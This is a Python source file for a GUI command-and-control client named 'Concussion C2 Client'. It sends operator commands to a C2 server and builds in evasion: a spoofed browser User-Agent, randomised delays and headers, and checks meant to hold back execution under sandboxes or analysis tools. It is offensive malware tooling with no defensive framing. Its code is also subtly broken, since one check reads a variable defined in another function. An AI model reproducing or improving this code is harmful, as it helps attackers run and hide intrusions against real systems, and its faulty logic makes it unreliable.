import requests
import random
import time
import gzip
import io
import tkinter as tk
import customtkinter  # Import the custom GUI library

# List of known sandbox artifacts (customize this list)
sandbox_artifacts = ["sandbox_file.exe", "sandbox_reg_key"]

# Define the C2 server address and port (replace with your server's IP and port)
C2_SERVER = "http://127.0.0.1:8080"

def send_get_request(command):
    # Introduce a randomized delay before sending GET requests
    randomized_delay()

    # Check for known sandbox artifacts before sending the request
    if check_sandbox_artifacts(command):
        result_label.config(text="Known sandbox artifacts detected. Execution delayed.")
        return

    # Check for dynamic analysis indicators before sending the request
    if check_dynamic_analysis():
        result_label.config(text="Dynamic analysis detected. Execution delayed.")
        return

    # Send an HTTP GET request to the C2 server with custom headers and variable content length
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'X-Custom-Header': 'MyCustomValue',  # Add your custom header here
        'Content-Length': str(random.randint(50, 500))  # Random content length
    }

    try:
        response = requests.get(f"{C2_SERVER}/{command}", headers=headers, timeout=10)
        result_label.config(text=decompress_response(response.content))
    except requests.exceptions.RequestException as e:
        result_label.config(text=str(e))

def check_sandbox_artifacts(command):
    # Check for known sandbox artifacts in the received command
    for artifact in sandbox_artifacts:
        if artifact in command:
            return True
    return False

def check_dynamic_analysis():
    # Check for indicators of dynamic analysis (customize this check)
    # For example, you can look for the presence of debuggers, virtualized environments, or monitoring tools
    if "debugger" in headers.get('User-Agent', '').lower():
        return True
    return False

def randomized_delay():
    # Introduce a random delay before sending a request (customize this delay)
    time.sleep(random.uniform(1, 5))

def decompress_response(response):
    # Decompress the response using gzip
    with gzip.GzipFile(fileobj=io.BytesIO(response), mode='rb') as f:
        decompressed_data = f.read()
    return decompressed_data.decode('utf-8')

def execute_command():
    command = command_entry.get()
    if command:
        send_get_request(command)

# Create a Tkinter window using the custom GUI library
window = customtkinter.CTk()
window.title("Concussion C2 Client")

# Create a label for displaying results
result_label = customtkinter.CTkLabel(window, text="", wraplength=400)
result_label.pack()

# Create an entry field for entering commands
command_entry = customtkinter.CTkEntry(window, width=50, placeholder_text="Enter your command")
command_entry.pack()

# Create a button to execute commands
execute_button = customtkinter.CTkButton(window, text="Execute", command=execute_command)
execute_button.pack()

if __name__ == "__main__":
    window.mainloop()
